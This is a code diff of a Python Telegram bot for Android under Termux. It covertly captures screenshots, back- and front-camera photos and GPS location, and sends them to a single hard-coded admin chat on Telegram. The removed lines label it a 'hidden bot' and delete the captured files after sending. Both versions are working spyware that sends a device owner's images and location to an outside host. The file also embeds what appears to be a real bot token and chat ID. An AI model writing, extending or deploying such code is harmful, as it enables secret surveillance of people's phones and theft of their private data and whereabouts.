@@ -1,152 +1,83 @@
 import requests
 import os
 import time
-import json
 
 TOKEN = "8845897358:AAFwhSC_b4oSXGeIsBtaiHabIvkbiXjpQIc"
 ADMIN = "6196009774"
 
-# Проверка токена при запуске
-try:
-    check = requests.get(f"https://api.telegram.org/bot{TOKEN}/getMe", timeout=5)
-    if check.status_code != 200:
-        print("❌ НЕПРАВИЛЬНЫЙ ТОКЕН! Проверь.")
-        exit()
-    print("✅ Токен правильный")
-except:
-    print("❌ Нет интернета или токен битый")
-    exit()
-
-print("📱 Бот запущен. Жду команд...")
+print("Запуск...")
 
 last = 0
 
-def send_photo(cid, path, cap):
-    try:
-        with open(path, "rb") as f:
-            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
-                data={"chat_id": cid, "caption": cap},
-                files={"photo": f},
-                timeout=15)
-    except Exception as e:
-        send_msg(cid, f"❌ Ошибка фото: {e}")
-
-def send_msg(cid, text):
-    try:
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
-            data={"chat_id": cid, "text": text},
-            timeout=10)
-    except:
-        pass
-
-def run_cmd(cmd, outfile):
-    os.system(f"{cmd} > {outfile} 2>&1")
-    time.sleep(1)
-    if os.path.exists(outfile):
-        return outfile
-    return None
-
 while True:
     try:
-        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last+1}&timeout=10"
-        r = requests.get(url, timeout=20).json()
+        url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last+1}"
+        r = requests.get(url, timeout=30).json()
         
         for u in r.get("result", []):
             last = u["update_id"]
             m = u.get("message", {})
             cid = str(m.get("chat", {}).get("id"))
-            txt = m.get("text", "").strip()
+            txt = m.get("text", "")
             
             if cid != ADMIN:
-                send_msg(cid, "⛔ Доступ запрещён")
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    data={"chat_id": cid, "text": "Нет доступа"})
                 continue
             
-            print(f"➡️ Команда: {txt}")
-            
             if txt == "/start":
-                send_msg(cid, """📱 **Скрытый бот**
-
-/screen — скриншот
-/camera — задняя камера
-/selfie — передняя камера
-/gps — геолокация
-/all — всё сразу
-/check — проверка доступа""")
-            
-            elif txt == "/check":
-                send_msg(cid, "✅ Бот работает. Доступ есть.")
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    data={"chat_id": cid, "text": "Бот работает! /screen /camera /selfie /gps"})
             
             elif txt == "/screen":
-                send_msg(cid, "📸 Делаю скриншот...")
-                path = run_cmd("screencap -p", "/sdcard/screen.png")
-                if path and os.path.getsize(path) > 1024:
-                    send_photo(cid, path, "📱 Экран")
-                else:
-                    send_msg(cid, "❌ Скриншот не удался (нужен root)")
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    data={"chat_id": cid, "text": "Делаю скрин..."})
+                os.system("screencap -p /sdcard/screen.png")
+                try:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
+                        data={"chat_id": cid, "caption": "Экран"},
+                        files={"photo": open("/sdcard/screen.png", "rb")})
+                except:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        data={"chat_id": cid, "text": "Ошибка скрина (нужен root)"})
             
             elif txt == "/camera":
-                send_msg(cid, "📷 Фоткаю...")
-                path = run_cmd("termux-camera-photo -c 0", "/sdcard/cam_back.jpg")
-                if path and os.path.getsize(path) > 1024:
-                    send_photo(cid, path, "📷 Задняя камера")
-                else:
-                    send_msg(cid, "❌ Камера не сработала (разреши доступ в Termux)")
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    data={"chat_id": cid, "text": "Фоткаю..."})
+                os.system("termux-camera-photo -c 0 /sdcard/cam.jpg")
+                try:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
+                        data={"chat_id": cid, "caption": "Задняя камера"},
+                        files={"photo": open("/sdcard/cam.jpg", "rb")})
+                except:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        data={"chat_id": cid, "text": "Ошибка камеры"})
             
             elif txt == "/selfie":
-                send_msg(cid, "🤳 Фоткаю...")
-                path = run_cmd("termux-camera-photo -c 1", "/sdcard/cam_front.jpg")
-                if path and os.path.getsize(path) > 1024:
-                    send_photo(cid, path, "🤳 Передняя камера")
-                else:
-                    send_msg(cid, "❌ Камера не сработала")
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    data={"chat_id": cid, "text": "Фоткаю..."})
+                os.system("termux-camera-photo -c 1 /sdcard/selfie.jpg")
+                try:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
+                        data={"chat_id": cid, "caption": "Передняя камера"},
+                        files={"photo": open("/sdcard/selfie.jpg", "rb")})
+                except:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        data={"chat_id": cid, "text": "Ошибка камеры"})
             
             elif txt == "/gps":
-                send_msg(cid, "📍 Ищу GPS...")
-                path = run_cmd("termux-location", "/sdcard/gps.txt")
-                if path:
-                    with open(path, "r") as f:
-                        data = f.read()[:500]
-                    if data.strip():
-                        send_msg(cid, f"📍 GPS:\n{data}")
-                    else:
-                        send_msg(cid, "❌ Нет GPS (разреши доступ или включи геолокацию)")
-            
-            elif txt == "/all":
-                send_msg(cid, "📦 Собираю всё...")
-                
-                for cmd, out, label in [
-                    ("screencap -p", "/sdcard/screen.png", "📱 Экран"),
-                    ("termux-camera-photo -c 0", "/sdcard/cam_back.jpg", "📷 Задняя"),
-                    ("termux-camera-photo -c 1", "/sdcard/cam_front.jpg", "🤳 Передняя"),
-                ]:
-                    p = run_cmd(cmd, out)
-                    if p and os.path.getsize(p) > 1024:
-                        send_photo(cid, p, label)
-                    else:
-                        send_msg(cid, f"❌ {label} — не удалось")
-                
-                path = run_cmd("termux-location", "/sdcard/gps.txt")
-                if path:
-                    with open(path, "r") as f:
-                        data = f.read()[:300]
-                    if data.strip():
-                        send_msg(cid, f"📍 {data}")
-                    else:
-                        send_msg(cid, "❌ GPS нет")
-            
-            elif txt:
-                send_msg(cid, f"⚠️ Неизвестная команда. Напиши /start")
-            
-            # Удаляем файлы после отправки, чтобы не засорять память
-            for f in ["/sdcard/screen.png", "/sdcard/cam_back.jpg", "/sdcard/cam_front.jpg", "/sdcard/gps.txt"]:
-                if os.path.exists(f):
-                    os.remove(f)
+                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                    data={"chat_id": cid, "text": "Ищу GPS..."})
+                os.system("termux-location > /sdcard/gps.txt")
+                try:
+                    with open("/sdcard/gps.txt", "r") as f:
+                        data = f.read()
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        data={"chat_id": cid, "text": "GPS:\n" + data[:400]})
+                except:
+                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                        data={"chat_id": cid, "text": "Ошибка GPS"})
         
         time.sleep(2)
-        
-    except KeyboardInterrupt:
-        print("\n🛑 Бот остановлен")
-        break
-    except Exception as e:
-        print(f"⚠️ Ошибка: {e}")
+    except:
         time.sleep(5)
